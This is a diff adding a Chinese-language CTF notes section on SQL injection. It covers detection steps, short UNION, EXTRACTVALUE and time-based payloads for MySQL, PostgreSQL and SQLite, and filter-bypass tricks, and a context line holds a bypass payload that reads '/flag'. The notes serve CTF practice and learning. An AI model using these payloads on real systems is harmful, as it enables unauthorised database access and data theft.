@@ -649,3 +649,39 @@ img = qrcode.make(payload)
 ```text
 ), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #
 ```
+
+---
+
+## 来自 CTF 经验积累
+
+### SQL注入快速检测
+**检测方法**:
+- 单引号测试: `' 或 `"`
+- 出现SQL错误 → 存在注入
+- 布尔测试: `id=1 AND 1=1` vs `id=1 AND 1=2`
+- 时间盲注: `id=1 AND SLEEP(5)`
+
+### 常用Payload
+**MySQL**:
+```sql
+-- 注释
+' OR '1'='1
+' UNION SELECT 1,2,3--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+```
+
+**PostgreSQL**:
+```sql
+' UNION SELECT null,version(),null--
+```
+
+**SQLite**:
+```sql
+' UNION SELECT sqlite_version(),null--
+```
+
+### 绕过技巧
+1. **空格替代**: `/**/`, `%20`, `+`, `%0b`
+2. **引号替代**: `0x十六进制`
+3. **关键字绕过**: `/*!select*/`, `/*!50000union*/`
+```
